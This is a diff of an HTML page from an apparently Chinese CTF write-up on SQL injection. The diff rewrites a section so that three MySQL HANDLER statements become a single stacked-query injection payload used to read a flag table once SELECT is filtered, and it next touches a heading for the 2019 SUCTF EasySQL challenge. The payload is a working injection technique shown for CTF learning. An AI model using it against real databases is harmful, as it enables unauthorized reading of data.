@@ -138,9 +138,9 @@
 <p>都被过滤用不了了</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt=""></p>
 <p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">详</a></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> cool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> cool;<span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">first</span>;<span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>通过以上三条语句应该就能得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p>
+<p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt=""></p>
 <h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p>
 <ul>
